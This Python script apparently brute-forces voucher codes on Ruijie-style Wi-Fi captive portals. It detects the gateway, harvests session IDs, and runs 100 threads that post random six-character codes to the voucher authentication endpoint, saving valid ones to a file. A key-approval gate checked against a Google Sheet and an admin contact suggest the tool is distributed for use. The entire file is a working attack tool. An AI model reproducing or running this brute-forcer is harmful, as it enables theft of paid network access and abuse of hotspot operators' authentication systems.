import requests
import random
import string
import time
import os
import threading
import re
import urllib3
import logging
import sys
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
# EXTREME CONFIG
# ==============================
NUM_THREADS = 100             
SESSION_POOL_SIZE = 30       
PER_SESSION_MAX = 200        
SAVE_PATH = "hits.txt"
STATS_FILE = "total_stats.txt"

# ===============================
# KEY SYSTEM CONFIG
# ===============================
SHEET_ID = "1MKfd87jf2GB9rE1QWTU0BCTno9l3my2ewdfpUEMM9hI"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

# Colors
red = "\033[0;31m"; green = "\033[0;32m"; yellow = "\033[0;33m"
cyan = "\033[0;36m"; white = "\033[0;37m"; reset = "\033[00m"
bgreen = "\033[1;32m"; bcyan = "\033[1;36m"; bred = "\033[1;31m"

# ==============================
# GLOBALS & STATS
# ==============================
session_pool = Queue()
valid_codes = [] 
tried_codes = set()
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

# ===============================
# KEY APPROVAL FUNCTIONS
# ===============================
def get_system_key():
    try: uid = os.geteuid()
    except: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not any(x in line.lower() for x in ['key', 'username']):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
                except: pass
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
    except: pass
    return keys

def check_approval():
    os.system('clear')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{bcyan}[!] Checking approval status...{reset}")
    
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    if system_key in authorized_keys:
        print(f"\n{bgreen}   [✓] KEY APPROVED! TURBO ENGINE UNLOCKED.{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}   [❌] KEY NOT APPROVED{reset}")
        print(f"   {yellow}Contact Admin: {reset}@Kenobe21")
        print(f"   {yellow}Your Key: {white}{system_key}{reset}")
        return False

# ==============================
# CORE SCANNER LOGIC
# ==============================
if os.path.exists(STATS_FILE):
    try:
        with open(STATS_FILE, "r") as f: TOTAL_TRIED = int(f.read().strip())
    except: TOTAL_TRIED = 0
else: TOTAL_TRIED = 0

if os.path.exists(SAVE_PATH):
    with open(SAVE_PATH, "r") as f:
        for line in f:
            match = re.search(r"\|\s*([a-z0-9]{6})\s*\|", line)
            if match: valid_codes.append(match.group(1))
    TOTAL_HITS = len(valid_codes)

def save_progress():
    with file_lock:
        with open(STATS_FILE, "w") as f: f.write(str(TOTAL_TRIED))

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r1 = s.get(test_url, allow_redirects=True, timeout=4)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=4)
            final_url = r2.url
            html_content = r1.text + r2.text
        else: html_content = r1.text
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', html_content)
            sid = sid_match.group(1) if sid_match else None
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    char_range = string.ascii_lowercase + string.digits 
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL: time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            sid = slot.get('sessionId')
            code = ''.join(random.choices(char_range, k=6))
            if code in tried_codes: continue
            tried_codes.add(code)
            CURRENT_CODE = code
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=6)
            TOTAL_TRIED += 1
            if TOTAL_TRIED % 100 == 0: save_progress()
            res_text = r.text.lower()
            if "true" in res_text:
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code); TOTAL_HITS += 1
                        save_locally(code, sid)
            if not any(m in res_text for m in ["timeout", "expired", "invalid"]) and r.status_code not in (401, 403):
                slot['left'] -= 1
                if slot['left'] > 0: session_pool.put(slot)
        except: pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    with file_lock:
        with open(SAVE_PATH, "a") as f: f.write(f"{ts} | {code} | SID: {sid}\n")

def live_dashboard():
    while not stop_event.is_set():
        os.system('clear')
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        print(f"{bcyan}" + "="*50)
        print("    RUIJIE TURBO SCANNER (V3 - KEY SECURED)    ")
        print("="*50 + f"{reset}")
        print(f" [TOTAL TRIED] : {TOTAL_TRIED:,}")
        print(f" [FOUND HITS]  : {green}{TOTAL_HITS}{reset}")
        print(f" [LIVE SPEED]  : {yellow}{speed:.1f} codes/sec{reset}")
        print(f" [LAST CODE]   : {cyan}{CURRENT_CODE}{reset}")
        print("-"*50)
        print(f"{bgreen} [ALL SUCCESS CODES]:{reset}")
        for c in valid_codes[-5:]: print(f"  >  {c}")
        print("-"*50)
        print(" (CTRL+C TO STOP)")
        time.sleep(2.0)

# ==============================
# MAIN ENTRY
# ==============================
if __name__ == "__main__":
    if check_approval():
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            save_progress()
            print(f"\n{red}[!] Scanner stopped. Progress saved.{reset}")
    else:
        sys.exit(1)
